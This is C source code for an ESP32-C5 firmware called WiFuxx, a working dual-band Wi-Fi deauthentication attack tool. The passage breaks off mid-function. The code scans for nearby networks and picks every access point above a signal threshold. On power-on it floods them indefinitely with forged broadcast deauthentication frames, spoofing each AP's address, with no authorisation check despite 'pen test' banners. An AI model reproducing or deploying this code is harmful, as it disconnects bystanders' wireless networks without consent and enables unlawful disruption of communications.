// main.c - WiFuxx C5 Dualband Deauthentication Tool - Infinite Attack Edition
// Dual-band deauth for ESP32-C5 — DevBoard (headless) variant.
// Scans on boot, attacks all targets above threshold indefinitely.
//
// DevBoard build: no OLED, no battery/charge hardware. Status is shown on the
// onboard WS2812B LED (GPIO27) and the serial console; control is via the WebUI
// (hold BOOT 2s to enter). See AGENTS.md for the shipped dual-variant firmware.

#include <stdio.h>
#include <string.h>
#include <stdlib.h>
#include <stdarg.h>
#include "freertos/FreeRTOS.h"
#include "freertos/task.h"
#include "freertos/semphr.h"
#include "esp_log.h"
#include "nvs_flash.h"
#include "esp_timer.h"
#include "esp_event.h"
#include "esp_wifi.h"
#include "esp_netif.h"
#include "esp_system.h"
#include "esp_attr.h"
#include "esp_http_server.h"
#include "esp_http_client.h"
#include "esp_https_ota.h"
#include "esp_ota_ops.h"
#include "esp_app_desc.h"
#include "esp_crt_bundle.h"
#include "freertos/event_groups.h"
#include "mdns.h"
#include "cJSON.h"
#include "driver/gpio.h"
#include "led_strip.h"
#include "settings.h"

static const char *TAG = "WiFuxx";

// ==================== CONFIGURATION ====================
// RSSI thresholds and burst sizes are now user-tunable at runtime and live in
// g_settings (NVS-backed, see settings.h). Their factory defaults are the
// WF_DEF_* macros there.
#define MAX_TARGETS                16
#define AUTO_SCAN_INTERVAL_SEC     25   // only used when no targets found on boot

#define CHANNEL_SWITCH_DELAY_MS    12
#define TARGET_BURST_DELAY_MS      1
#define BAND_SWITCH_DELAY_MS       5

// Status LED (WS2812B)
#define STATUS_LED_GPIO        GPIO_NUM_27
#define STATUS_LED_BRIGHTNESS  64    // 25% of 255 (0.25 * 255 ~= 64)
#define STATUS_LED_TICK_MS     40    // animation update period

// SoftAP / WebUI mode — SSID and channel are user-tunable (g_settings.ap_ssid /
// g_settings.ap_channel); factory defaults are WF_DEF_AP_SSID / WF_DEF_AP_CHANNEL.
#define WEBUI_AP_MAX_CONN  1
#define WEBUI_AP_IP        "192.168.42.42"   // device IP, gateway and DNS in WebUI mode
#define WEBUI_MDNS_HOST    "wifuxx"           // -> http://wifuxx.local (alongside the IP)
#define WEBUI_SCAN_MAX     32                // APs surfaced in the WebUI scan list (attack stays MAX_TARGETS)

// BOOT button — 2s hold (at runtime) enters WebUI.
// NOTE: on the XIAO ESP32-C5 the BOOT button is GPIO28 (Arduino BOOT_PIN), NOT GPIO9.
// GPIO28 is the boot strapping pin: holding it during power-on/reset enters serial
// download mode (the app never runs), so we can only poll it AFTER boot.
#define BOOT_BUTTON_GPIO   GPIO_NUM_28
#define BUTTON_HOLD_MS     2000
#define BUTTON_RESET_HOLD_MS 10000   // WebUI mode: hold this long to factory-reset (lockout escape)
#define BUTTON_POLL_MS     20

// OTA update — the WebUI "Update" card saves home Wi-Fi creds and reboots into OTA
// mode, which joins the home AP (STA), asks GitHub for the latest release tag, and
// (if newer) flashes the release asset into the inactive OTA slot. Single-radio, so
// like WebUI this is a dedicated boot mode with serial progress — no AP+STA.
#define OTA_GITHUB_OWNER    "stokemctoke"
#define OTA_GITHUB_REPO     "WiFuxx_ESP32-C5-Auto-Dualband-Deauth"
#define OTA_ASSET_NAME      "WiFuxx_Dualband_Deauther.bin"  // must match the release asset
#define OTA_WIFI_TIMEOUT_MS 20000
#define OTA_WIFI_MAX_RETRY  5
// =======================================================

// ==================== Boot Mode (persisted across esp_restart in RTC memory) ====================
// RTC_NOINIT survives a software reset but holds garbage after a true power-on,
// so a magic value distinguishes the two: an unrecognised magic = cold boot =>
// default to autonomous ATTACK. Mode switches are done by writing these then
// rebooting, so every boot is a clean, single-purpose Wi-Fi init.
#define BOOT_MODE_MAGIC    0x57463232u   // 'WF22'
#define BOOT_MODE_ATTACK   0u
#define BOOT_MODE_WEBUI    1u
#define BOOT_MODE_OTA      3u            // STA -> home AP -> check GitHub -> OTA update
#define SEL_MODE_ALL       0u            // attack all targets above threshold (autonomous default)
#define SEL_MODE_SINGLE    1u            // attack only g_sel_mac (ignores threshold)
#define SEL_MODE_DUALBAND  2u            // attack every BSSID of g_sel_ssid, both bands (ignores threshold)

RTC_NOINIT_ATTR static uint32_t g_boot_magic;
RTC_NOINIT_ATTR static uint32_t g_boot_mode;
RTC_NOINIT_ATTR static uint32_t g_sel_mode;
RTC_NOINIT_ATTR static uint8_t  g_sel_mac[6];
RTC_NOINIT_ATTR static char     g_sel_ssid[33];

typedef struct {
    uint8_t bssid[6];
    char ssid[33];
    uint8_t channel;
    uint32_t packets_sent;
    bool active;
    int rssi;
} attack_target_t;

typedef struct {
    attack_target_t targets[MAX_TARGETS];
    uint16_t count;
} target_list_t;

// Global state — volatile where read/written across tasks
static volatile bool attack_running  = false;
static target_list_t auto_targets    = {0};
static uint32_t attack_start_time    = 0;
static TaskHandle_t attack_task_handle = NULL;

// Display data
static SemaphoreHandle_t display_mutex = NULL;
typedef struct {
    uint8_t ap_count_24;
    uint8_t ap_count_5;
    char status[16];
    char ssid_list[8][32];
    uint8_t ssid_count;
} display_info_t;
static display_info_t current_display_info = {0};

// True in WebUI mode (vs scan/attack); status_log_task uses it to pick what to
// log. Set once at boot in WebUI mode (mode is fixed per boot).
static volatile bool g_webui_display = false;

// Set by the 10s-BOOT-hold factory reset so status_log_task announces the reset
// on the serial console before the device reboots (otherwise it's silent).
static volatile bool g_webui_resetting = false;

// Deauth reason codes
static const uint16_t deauth_reasons[] = {
    0x0001, 0x0003, 0x0006, 0x0007, 0x0008, 0x000C, 0x000D
};
static const uint8_t num_reasons = sizeof(deauth_reasons) / sizeof(deauth_reasons[0]);

// ==================== Status LED ====================
// Color signals on a single WS2812B at STATUS_LED_GPIO, scaled to 25% brightness.
//   BOOT         : solid blue        — chip powering up
//   WIFI_INIT    : solid magenta     — bringing up Wi-Fi
//   SCANNING     : cyan fast pulse   — scanning for networks
//   NO_TARGETS   : yellow slow blink — scan complete, nothing strong enough, retrying
//   TARGETS_FOUND: solid green       — targets locked, attack about to start
//   ATTACKING    : red breathing     — deauth burst loop running
//   WEBUI_IDLE   : rainbow breath    — SoftAP up, WebUI awaiting commands
typedef enum {
    LED_STATE_BOOT = 0,
    LED_STATE_WIFI_INIT,
    LED_STATE_SCANNING,
    LED_STATE_NO_TARGETS,
    LED_STATE_TARGETS_FOUND,
    LED_STATE_ATTACKING,
    LED_STATE_WEBUI_IDLE,
} led_state_t;

static volatile led_state_t led_state = LED_STATE_BOOT;
static led_strip_handle_t   status_led = NULL;

#include "monitor_bitmap.h"   // ASCII boot splash on the serial console
#include "favicon.h"          // WebUI favicon

// ==================== Status LED Driver ====================
static void status_led_init(void) {
    led_strip_config_t strip_cfg = {
        .strip_gpio_num        = STATUS_LED_GPIO,
        .max_leds              = 1,
        .led_model             = LED_MODEL_WS2812,
        .color_component_format = LED_STRIP_COLOR_COMPONENT_FMT_GRB,
        .flags                 = { .invert_out = false },
    };
    led_strip_rmt_config_t rmt_cfg = {
        .clk_src           = RMT_CLK_SRC_DEFAULT,
        .resolution_hz     = 10 * 1000 * 1000,  // 10MHz
        .mem_block_symbols = 0,
        .flags             = { .with_dma = 0 },
    };
    if (led_strip_new_rmt_device(&strip_cfg, &rmt_cfg, &status_led) != ESP_OK) {
        ESP_LOGW(TAG, "Status LED init failed");
        status_led = NULL;
        return;
    }
    led_strip_clear(status_led);
    led_strip_refresh(status_led);
}

// Scale a 0..255 channel down to STATUS_LED_BRIGHTNESS (25%).
static inline uint8_t led_scale(uint8_t v) {
    return (uint16_t)v * STATUS_LED_BRIGHTNESS / 255;
}

// 0..255 triangle wave for breathing/pulsing — `period_ms` is full cycle length.
static uint8_t triangle_wave(uint32_t t_ms, uint32_t period_ms) {
    uint32_t phase = t_ms % period_ms;
    uint32_t half  = period_ms / 2;
    return (phase < half)
         ? (uint8_t)(phase * 255 / half)
         : (uint8_t)((period_ms - phase) * 255 / half);
}

// Full-saturation HSV -> RGB. `hue` 0..255 wraps the colour wheel, `val` 0..255
// is brightness. Used for the WebUI-idle rainbow breath.
static void hsv_to_rgb(uint8_t hue, uint8_t val, uint8_t *r, uint8_t *g, uint8_t *b) {
    uint8_t region = hue / 43;                 // 0..5 sextant
    uint8_t rem    = (hue - region * 43) * 6;  // position within sextant, 0..255
    uint8_t q  = (uint16_t)val * (255 - rem) / 255;
    uint8_t tt = (uint16_t)val * rem / 255;
    switch (region) {
        case 0:  *r = val; *g = tt;  *b = 0;   break;
        case 1:  *r = q;   *g = val; *b = 0;   break;
        case 2:  *r = 0;   *g = val; *b = tt;  break;
        case 3:  *r = 0;   *g = q;   *b = val; break;
        case 4:  *r = tt;  *g = 0;   *b = val; break;
        default: *r = val; *g = 0;   *b = q;   break;
    }
}

static void status_led_task(void *pvParameters) {
    uint32_t t = 0;
    while (1) {
        uint8_t r = 0, g = 0, b = 0;

        switch (led_state) {
            case LED_STATE_BOOT:
                // Solid blue
                b = 255;
                break;
            case LED_STATE_WIFI_INIT:
                // Solid magenta
                r = 255; b = 200;
                break;
            case LED_STATE_SCANNING: {
                // Cyan fast pulse (~600ms period)
                uint8_t lvl = triangle_wave(t, 600);
                g = lvl; b = lvl;
                break;
            }
            case LED_STATE_NO_TARGETS: {
                // Yellow slow blink (~1.6s on/off)
                bool on = ((t / 800) & 1) == 0;
                if (on) { r = 255; g = 180; }
                break;
            }
            case LED_STATE_TARGETS_FOUND:
                // Solid green
                g = 255;
                break;
            case LED_STATE_ATTACKING: {
                // Red breathing (~900ms cycle) with a floor so it never fully drops to black
                uint8_t lvl = triangle_wave(t, 900);
                if (lvl < 60) lvl = 60;
                r = lvl;
                break;
            }
            case LED_STATE_WEBUI_IDLE: {
                // Rainbow breath: a slow ~4s breath whose hue drifts so each breath
                // starts on a new colour, looping the spectrum about every 24s. A
                // brightness floor keeps it gently glowing instead of going black.
                uint8_t breath = triangle_wave(t, 4000);
                if (breath < 40) breath = 40;
                uint8_t hue = (t / 94) & 0xFF;   // 256 * 94ms ≈ 24s full rainbow
                hsv_to_rgb(hue, breath, &r, &g, &b);
                break;
            }
        }

        if (status_led) {
            led_strip_set_pixel(status_led, 0, led_scale(r), led_scale(g), led_scale(b));
            led_strip_refresh(status_led);
        }

        vTaskDelay(pdMS_TO_TICKS(STATUS_LED_TICK_MS));
        t += STATUS_LED_TICK_MS;
    }
}

// ==================== Deauth Frame ====================
typedef struct {
    uint8_t  frame_ctrl[2];
    uint8_t  duration[2];
    uint8_t  da[6];
    uint8_t  sa[6];
    uint8_t  bssid[6];
    uint8_t  seq[2];
    uint8_t  reason[2];
} __attribute__((packed)) deauth_frame_t;

// ==================== Utility ====================
static uint32_t get_time_sec(void) {
    return (uint32_t)(esp_timer_get_time() / 1000000ULL);
}

// Firmware version compiled into the app descriptor (from version.txt via IDF's
// PROJECT_VER). Used both for display and the OTA "is a newer release out?" check.
static const char *fw_version(void) {
    return esp_app_get_description()->version;
}

// Parse the first up-to-three dotted integers of a version string into v[3],
// skipping any leading non-digits (e.g. a "v" prefix) and ignoring any suffix
// (e.g. "-5-gabcdef"). Missing components read as 0.
static void parse_semver(const char *s, int v[3]) {
    v[0] = v[1] = v[2] = 0;
    while (*s && (*s < '0' || *s > '9')) s++;
    sscanf(s, "%d.%d.%d", &v[0], &v[1], &v[2]);
}

// Compare two semver strings: >0 if a is newer than b, <0 if older, 0 if equal.
static int semver_cmp(const char *a, const char *b) {
    int va[3], vb[3];
    parse_semver(a, va);
    parse_semver(b, vb);
    for (int i = 0; i < 3; i++)
        if (va[i] != vb[i]) return va[i] > vb[i] ? 1 : -1;
    return 0;
}

// Read an HTTP request body up to buf_sz-1 bytes (null-terminated). Returns the
// number of payload bytes stored, or a negative value on a hard recv error.
static int http_recv_body(httpd_req_t *req, char *buf, size_t buf_sz) {
    int to_read = req->content_len;
    if (to_read <= 0 || to_read >= (int)buf_sz)
        to_read = (int)buf_sz - 1;

    int received = 0;
    while (received < to_read) {
        int r = httpd_req_recv(req, buf + received, to_read - received);
        if (r == HTTPD_SOCK_ERR_TIMEOUT) continue;
        if (r <= 0) return received > 0 ? received : r;
        received += r;
    }
    buf[received] = '\0';
    return received;
}

static void wifi_check(esp_err_t err, const char *what) {
    if (err != ESP_OK)
        ESP_LOGE(TAG, "%s failed: %s", what, esp_err_to_name(err));
}

// ==================== Boot Mode Helpers ====================
// Validate RTC state on entry. On a power-on/brown-out (magic absent or an
// explicit power reset) force the autonomous ATTACK default; otherwise trust
// the values a previous mode-switch reboot left behind.
static void boot_mode_init(void) {
    esp_reset_reason_t reason = esp_reset_reason();
    bool cold = (g_boot_magic != BOOT_MODE_MAGIC) ||
                (reason == ESP_RST_POWERON) ||
                (reason == ESP_RST_BROWNOUT);
    if (cold) {
        g_boot_magic = BOOT_MODE_MAGIC;
        g_boot_mode  = BOOT_MODE_ATTACK;
        g_sel_mode   = SEL_MODE_ALL;
        memset(g_sel_mac, 0, sizeof(g_sel_mac));
        g_sel_ssid[0] = '\0';
    }
    const char *mode_name = g_boot_mode == BOOT_MODE_WEBUI  ? "WEBUI"
                          : g_boot_mode == BOOT_MODE_OTA    ? "OTA" : "ATTACK";
    ESP_LOGI(TAG, "Boot mode: %s (reset reason %d)", mode_name, (int)reason);
}

// Persist the next-boot mode and reset into it. Wi-Fi/HTTP/promiscuous teardown
// is implicit in the reset, which is exactly why this is more robust than an
// in-place mode switch on the ESP32-C5.
static void reboot_into(uint32_t mode) {
    g_boot_magic = BOOT_MODE_MAGIC;
    g_boot_mode  = mode;
    ESP_LOGW(TAG, "Rebooting into %s mode",
             mode == BOOT_MODE_WEBUI ? "WEBUI"
             : mode == BOOT_MODE_OTA ? "OTA" : "ATTACK");
    vTaskDelay(pdMS_TO_TICKS(150));  // let any in-flight HTTP response / log flush
    esp_restart();
}

// ==================== Deauth ====================
// Returns true when the frame was accepted by the Wi-Fi driver.
static bool send_deauth_frame(const uint8_t *ap_mac, uint16_t reason) {
    static const uint8_t broadcast[6] = {0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF};
    static uint16_t seq_num = 0;

    deauth_frame_t frame = {
        .frame_ctrl = {0xC0, 0x00},
        .duration   = {0x00, 0x00},
    };
    memcpy(frame.da,    broadcast, 6);
    memcpy(frame.sa,    ap_mac,   6);
    memcpy(frame.bssid, ap_mac,   6);

    // Rolling sequence number makes frames look more legitimate
    frame.seq[0] = (seq_num << 4) & 0xF0;
    frame.seq[1] = (seq_num >> 4) & 0xFF;
    seq_num++;

    frame.reason[0] = reason & 0xFF;
    frame.reason[1] = (reason >> 8) & 0xFF;

    for (int attempt = 0; attempt < 4; attempt++) {
        esp_err_t err = esp_wifi_80211_tx(WIFI_IF_STA, &frame, sizeof(frame), false);
        if (err == ESP_OK) return true;
        if (err == ESP_ERR_NO_MEM) {
            vTaskDelay(pdMS_TO_TICKS(2));   // let the TX queue drain
            continue;
        }
        static uint32_t tx_fail_count;
        if ((++tx_fail_count % 256) == 1)
            ESP_LOGW(TAG, "esp_wifi_80211_tx failed: %s (suppressing repeats)", esp_err_to_name(err));
        return false;
    }
    return false;
}

// Attack all targets in one band's target list, iterating by channel
static void attack_band(target_list_t *list, uint8_t burst_size, bool is_5ghz) {
    (void)is_5ghz;
    if (list->count == 0) return;

    // Collect unique channels — at most MAX_TARGETS unique channels possible
    uint8_t channels[MAX_TARGETS];
    uint8_t num_channels = 0;

    for (int i = 0; i < list->count; i++) {
        uint8_t ch = list->targets[i].channel;
        bool found = false;
        for (int j = 0; j < num_channels; j++) {
            if (channels[j] == ch) { found = true; break; }
        }
        if (!found) channels[num_channels++] = ch;
    }

    for (int c = 0; c < num_channels; c++) {
        esp_wifi_set_channel(channels[c], WIFI_SECOND_CHAN_NONE);
        vTaskDelay(pdMS_TO_TICKS(CHANNEL_SWITCH_DELAY_MS));

        for (int t = 0; t < list->count; t++) {
            attack_target_t *target = &list->targets[t];
            if (!target->active || target->channel != channels[c]) continue;

            for (int i = 0; i < burst_size; i++) {
                if (send_deauth_frame(target->bssid, deauth_reasons[i % num_reasons]))
                    target->packets_sent++;

                // Yield on 5 GHz only — 2.4 GHz runs tight; extra delays there
                // starve throughput without helping the TX queue on this chip.
                if (i % 8 == 7 && is_5ghz)
                    vTaskDelay(pdMS_TO_TICKS(1));
            }
            vTaskDelay(pdMS_TO_TICKS(TARGET_BURST_DELAY_MS));
        }
    }
}

// ==================== Attack Task ====================
static void multi_band_attack_task(void *pvParameters) {
    ESP_LOGI(TAG, "╔════════════════════════════════════════╗");
    ESP_LOGI(TAG, "║          PRO DEAUTH PEN TEST           ║");
    ESP_LOGI(TAG, "║        DUAL-BAND ATTACK ACTIVE         ║");
    ESP_LOGI(TAG, "╚════════════════════════════════════════╝");

    target_list_t targets_24 = {0};
    target_list_t targets_5  = {0};

    for (int i = 0; i < auto_targets.count; i++) {
        if (auto_targets.targets[i].channel <= 14)
            targets_24.targets[targets_24.count++] = auto_targets.targets[i];
        else
            targets_5.targets[targets_5.count++]   = auto_targets.targets[i];
    }

    ESP_LOGI(TAG, "2.4GHz Targets: %d", targets_24.count);
    for (int i = 0; i < targets_24.count; i++) {
        ESP_LOGI(TAG, "  [%d] %s (CH %d, RSSI %d)",
                 i, targets_24.targets[i].ssid,
                 targets_24.targets[i].channel, targets_24.targets[i].rssi);
    }

    ESP_LOGI(TAG, "5GHz Targets: %d", targets_5.count);
    for (int i = 0; i < targets_5.count; i++) {
        ESP_LOGI(TAG, "  [%d] %s (CH %d, RSSI %d)",
                 i, targets_5.targets[i].ssid,
                 targets_5.targets[i].channel, targets_5.targets[i].rssi);
    }

    ESP_LOGI(TAG, "Attack duration: INFINITE");

    if (display_mutex) {
        xSemaphoreTake(display_mutex, portMAX_DELAY);
        strcpy(current_display_info.status, "ATTACK");
        xSemaphoreGive(display_mutex);
    }

    attack_start_time = get_time_sec();
    uint32_t last_log_time = 0;
    uint32_t cycle_count   = 0;

    for (int i = 0; i < auto_targets.count; i++)
        auto_targets.targets[i].packets_sent = 0;

    ESP_LOGI(TAG, "DUAL-BAND ATTACK STARTED!");

    while (attack_running) {
        uint32_t elapsed = get_time_sec() - attack_start_time;

        if (targets_24.count > 0) {
            attack_band(&targets_24, g_settings.burst_24, false);
            vTaskDelay(pdMS_TO_TICKS(BAND_SWITCH_DELAY_MS));
        }

        if (targets_5.count > 0) {
            attack_band(&targets_5, g_settings.burst_5, true);
            vTaskDelay(pdMS_TO_TICKS(BAND_SWITCH_DELAY_MS));
        }

        cycle_count++;

        if (elapsed - last_log_time >= 2) {
            last_log_time = elapsed;

            uint32_t pkt_24 = 0, pkt_5 = 0;
            for (int i = 0; i < targets_24.count; i++) pkt_24 += targets_24.targets[i].packets_sent;
            for (int i = 0; i < targets_5.count;  i++) pkt_5  += targets_5.targets[i].packets_sent;

            uint32_t total        = pkt_24 + pkt_5;
            uint32_t elapsed_safe = elapsed > 0 ? elapsed : 1;
            float    pps          = (float)total / elapsed_safe;

            ESP_LOGI(TAG, "[%lu s] Total: %6lu pkt | PPS: %4.0f | Cycles: %lu",
                     elapsed, total, pps, cycle_count);

            if (targets_24.count > 0)
                ESP_LOGI(TAG, "  2.4GHz: %6lu pkt (%4.0f pps) - %d targets",
                         pkt_24, (float)pkt_24 / elapsed_safe, targets_24.count);

            if (targets_5.count > 0)
                ESP_LOGI(TAG, "  5GHz:   %6lu pkt (%4.0f pps) - %d targets",
                         pkt_5, (float)pkt_5 / elapsed_safe, targets_5.count);

            if (display_mutex) {
                xSemaphoreTake(display_mutex, portMAX_DELAY);
                current_display_info.ap_count_24 = targets_24.count;
                current_display_info.ap_count_5  = targets_5.count;
                snprintf(current_display_info.status, sizeof(current_display_info.status),
                         "ATK %lus", elapsed);
                xSemaphoreGive(display_mutex);
            }
        }
    }

    // Final statistics
    uint32_t total_time = get_time_sec() - attack_start_time;
    uint32_t pkt_24 = 0, pkt_5 = 0;
    for (int i = 0; i < targets_24.count; i++) pkt_24 += targets_24.targets[i].packets_sent;
    for (int i = 0; i < targets_5.count;  i++) pkt_5  += targets_5.targets[i].packets_sent;

    uint32_t total      = pkt_24 + pkt_5;
    uint32_t time_safe  = total_time > 0 ? total_time : 1;
    float    avg_pps    = (float)total / time_safe;

    const char *rating = avg_pps > 1000 ? "DEVASTATING!" :
                         avg_pps > 700  ? "EXCELLENT"    :
                         avg_pps > 400  ? "GOOD"         : "MODERATE";

    ESP_LOGI(TAG, "╔════════════════════════════════════════╗");
    ESP_LOGI(TAG, "║            ATTACK COMPLETED            ║");
    ESP_LOGI(TAG, "╚════════════════════════════════════════╝");
    ESP_LOGI(TAG, "Total packets : %lu", total);
    ESP_LOGI(TAG, "Total time    : %lu seconds", total_time);
    ESP_LOGI(TAG, "Average PPS   : %.0f", avg_pps);
    ESP_LOGI(TAG, "2.4GHz        : %lu pkt (%.0f pps) across %d targets",
             pkt_24, (float)pkt_24 / time_safe, targets_24.count);
    ESP_LOGI(TAG, "5GHz          : %lu pkt (%.0f pps) across %d targets",
             pkt_5,  (float)pkt_5  / time_safe, targets_5.count);
    ESP_LOGI(TAG, "Effectiveness : %s", rating);

    attack_running = false;

    if (display_mutex) {
        xSemaphoreTake(display_mutex, portMAX_DELAY);
        strcpy(current_display_info.status, "IDLE");
        xSemaphoreGive(display_mutex);
    }

    attack_task_handle = NULL;
    vTaskDelete(NULL);
}

static bool start_multi_band_attack(void) {
    if (attack_running) {
        ESP_LOGW(TAG, "Attack already running");
        return false;
    }
    if (auto_targets.count == 0) {
        ESP_LOGW(TAG, "No targets selected");
        return false;
    }
    attack_running = true;
    if (xTaskCreate(multi_band_attack_task, "multi_band_attack", 8192,
                    NULL, 5, &attack_task_handle) != pdPASS) {
        ESP_LOGE(TAG, "Failed to create attack task");
        attack_running = false;
        return false;
    }
    return true;
}

// ==================== Scan and Filter ====================
// Sort scan results strongest-first so the limited MAX_TARGETS slots always go to
// the loudest APs rather than whatever order the driver returned them in.
static int cmp_ap_rssi_desc(const void *a, const void *b) {
    int ra = ((const wifi_ap_record_t *)a)->rssi;
    int rb = ((const wifi_ap_record_t *)b)->rssi;
    return (rb > ra) - (rb < ra);
}

static uint16_t scan_and_filter_targets(void) {
    wifi_scan_config_t scan_config = {
        .ssid        = 0,
        .bssid       = 0,
        .channel     = 0,
        .show_hidden = true,
    };

    led_state = LED_STATE_SCANNING;
    ESP_LOGI(TAG, "Scanning for networks...");
    if (esp_wifi_scan_start(&scan_config, true) != ESP_OK) {
        ESP_LOGE(TAG, "Scan failed");
        led_state = LED_STATE_NO_TARGETS;
        return 0;
    }

    uint16_t ap_num = 0;
    esp_wifi_scan_get_ap_num(&ap_num);
    ESP_LOGI(TAG, "Found %d total networks", ap_num);
    if (ap_num == 0) return 0;

    wifi_ap_record_t *ap_info = calloc(ap_num, sizeof(wifi_ap_record_t));
    if (!ap_info) {
        ESP_LOGE(TAG, "Scan alloc failed (%u APs)", ap_num);
        return 0;
    }
    esp_wifi_scan_get_ap_records(&ap_num, ap_info);

    // Strongest-first: the MAX_TARGETS cap then takes the loudest APs above threshold.
    qsort(ap_info, ap_num, sizeof(wifi_ap_record_t), cmp_ap_rssi_desc);

    auto_targets.count = 0;
    memset(&auto_targets.targets, 0, sizeof(auto_targets.targets));

    uint8_t count_24 = 0, count_5 = 0;

    for (int i = 0; i < ap_num && auto_targets.count < MAX_TARGETS; i++) {
        int threshold = (ap_info[i].primary <= 14)
                        ? g_settings.thr_24
                        : g_settings.thr_5;

        if (ap_info[i].rssi <= threshold) continue;

        attack_target_t *t = &auto_targets.targets[auto_targets.count];
        memcpy(t->bssid, ap_info[i].bssid, 6);

        if (strlen((char *)ap_info[i].ssid) == 0) {
            strcpy(t->ssid, "Hidden");
        } else {
            strncpy(t->ssid, (char *)ap_info[i].ssid, sizeof(t->ssid) - 1);
            t->ssid[sizeof(t->ssid) - 1] = '\0';
        }

        t->channel      = ap_info[i].primary;
        t->active       = true;
        t->packets_sent = 0;
        t->rssi         = ap_info[i].rssi;

        const char *band = (t->channel <= 14) ? "2.4GHz" : "5GHz";
        if (t->channel <= 14) count_24++; else count_5++;

        ESP_LOGI(TAG, "  [%d] %s (CH %d, %s, RSSI %d, MAC %02x:%02x:%02x:%02x:%02x:%02x)",
                 auto_targets.count, t->ssid, t->channel, band, t->rssi,
                 t->bssid[0], t->bssid[1], t->bssid[2],
                 t->bssid[3], t->bssid[4], t->bssid[5]);

        auto_targets.count++;
    }

    free(ap_info);
    ESP_LOGI(TAG, "Selected %d targets (%d on 2.4GHz, %d on 5GHz)",
             auto_targets.count, count_24, count_5);

    // Update display info
    display_info_t disp = {
        .ap_count_24 = count_24,
        .ap_count_5  = count_5,
        .ssid_count  = (auto_targets.count > 8) ? 8 : (uint8_t)auto_targets.count,
    };
    strcpy(disp.status, "SCAN");
    for (int i = 0; i < disp.ssid_count; i++) {
        strncpy(disp.ssid_list[i], auto_targets.targets[i].ssid, 31);
        disp.ssid_list[i][31] = '\0';
    }

    if (display_mutex) {
        xSemaphoreTake(display_mutex, portMAX_DELAY);
        memcpy(&current_display_info, &disp, sizeof(display_info_t));
        xSemaphoreGive(display_mutex);
    }

    return auto_targets.count;
}

// Fresh scan that IGNORES the RSSI thresholds and arms only the WebUI-selected
// target(s): SEL_MODE_SINGLE keeps the one BSSID g_sel_mac; SEL_MODE_DUALBAND keeps
// every BSSID broadcasting g_sel_ssid (both bands). A manual pick beats the
// threshold, by design. Returns the number of targets armed.
static uint16_t scan_selected_targets(void) {
    wifi_scan_config_t scan_config = {
        .ssid        = 0,
        .bssid       = 0,
        .channel     = 0,
        .show_hidden = true,
    };

    led_state = LED_STATE_SCANNING;
    ESP_LOGI(TAG, "Scanning for WebUI-selected target(s)...");
    if (esp_wifi_scan_start(&scan_config, true) != ESP_OK) {
        ESP_LOGE(TAG, "Scan failed");
        led_state = LED_STATE_NO_TARGETS;
        return 0;
    }

    uint16_t ap_num = 0;
    esp_wifi_scan_get_ap_num(&ap_num);
    if (ap_num == 0) return 0;

    wifi_ap_record_t *ap_info = calloc(ap_num, sizeof(wifi_ap_record_t));
    if (!ap_info) {
        ESP_LOGE(TAG, "Scan alloc failed (%u APs)", ap_num);
        return 0;
    }
    esp_wifi_scan_get_ap_records(&ap_num, ap_info);

    auto_targets.count = 0;
    memset(&auto_targets.targets, 0, sizeof(auto_targets.targets));
    uint8_t count_24 = 0, count_5 = 0;

    for (int i = 0; i < ap_num && auto_targets.count < MAX_TARGETS; i++) {
        wifi_ap_record_t *ap = &ap_info[i];

        bool match = (g_sel_mode == SEL_MODE_SINGLE)
                     ? (memcmp(ap->bssid, g_sel_mac, 6) == 0)
                     : (g_sel_ssid[0] != '\0' &&
                        strcmp((char *)ap->ssid, g_sel_ssid) == 0);
        if (!match) continue;

        attack_target_t *t = &auto_targets.targets[auto_targets.count];
        memcpy(t->bssid, ap->bssid, 6);
        if (strlen((char *)ap->ssid) == 0) {
            strcpy(t->ssid, "Hidden");
        } else {
            strncpy(t->ssid, (char *)ap->ssid, sizeof(t->ssid) - 1);
            t->ssid[sizeof(t->ssid) - 1] = '\0';
        }
        t->channel      = ap->primary;
        t->active       = true;
        t->packets_sent = 0;
        t->rssi         = ap->rssi;
        if (t->channel <= 14) count_24++; else count_5++;

        ESP_LOGI(TAG, "  armed %s (CH %d, RSSI %d)", t->ssid, t->channel, t->rssi);
        auto_targets.count++;
    }
    free(ap_info);

    ESP_LOGI(TAG, "WebUI selection armed %d target(s) (%d on 2.4G, %d on 5G)",
             auto_targets.count, count_24, count_5);

    display_info_t disp = {
        .ap_count_24 = count_24,
        .ap_count_5  = count_5,
        .ssid_count  = (auto_targets.count > 8) ? 8 : (uint8_t)auto_targets.count,
    };
    strcpy(disp.status, "SCAN");
    for (int i = 0; i < disp.ssid_count; i++) {
        strncpy(disp.ssid_list[i], auto_targets.targets[i].ssid, 31);
        disp.ssid_list[i][31] = '\0';
    }
    if (display_mutex) {
        xSemaphoreTake(display_mutex, portMAX_DELAY);
        memcpy(&current_display_info, &disp, sizeof(display_info_t));
        xSemaphoreGive(display_mutex);
    }

    return auto_targets.count;
}

// ==================== Autonomous Mode Task ====================
static void autonomous_mode_task(void *pvParameters) {
    ESP_LOGI(TAG, "╔════════════════════════════════════════╗");
    ESP_LOGI(TAG, "║          PRO DEAUTH PEN TEST           ║");
    ESP_LOGI(TAG, "║        AUTONOMOUS MODE ACTIVE          ║");
    ESP_LOGI(TAG, "╚════════════════════════════════════════╝");
    ESP_LOGI(TAG, "2.4GHz threshold : > %d dBm", g_settings.thr_24);
    ESP_LOGI(TAG, "5GHz threshold   : > %d dBm", g_settings.thr_5);
    ESP_LOGI(TAG, "Max targets      : %d", MAX_TARGETS);
    ESP_LOGI(TAG, "Scan interval    : %d s (when no targets found)", AUTO_SCAN_INTERVAL_SEC);
    ESP_LOGI(TAG, "Attack duration  : INFINITE");

    if (display_mutex) {
        xSemaphoreTake(display_mutex, portMAX_DELAY);
        strcpy(current_display_info.status, "IDLE");
        xSemaphoreGive(display_mutex);
    }

    while (1) {
        // A WebUI selection (single/dualband) arms specific BSSIDs ignoring the
        // RSSI threshold; otherwise fall back to the autonomous threshold scan.
        uint16_t target_count =
            (g_sel_mode == SEL_MODE_SINGLE || g_sel_mode == SEL_MODE_DUALBAND)
                ? scan_selected_targets()
                : scan_and_filter_targets();

        if (target_count > 0) {
            led_state = LED_STATE_TARGETS_FOUND;
            ESP_LOGI(TAG, "Starting infinite attack on %d targets", target_count);
            vTaskDelay(pdMS_TO_TICKS(500));  // brief green flash so user sees the lock-on
            start_multi_band_attack();
            led_state = LED_STATE_ATTACKING;
            while (attack_running) vTaskDelay(pdMS_TO_TICKS(1000));
        } else {
            led_state = LED_STATE_NO_TARGETS;
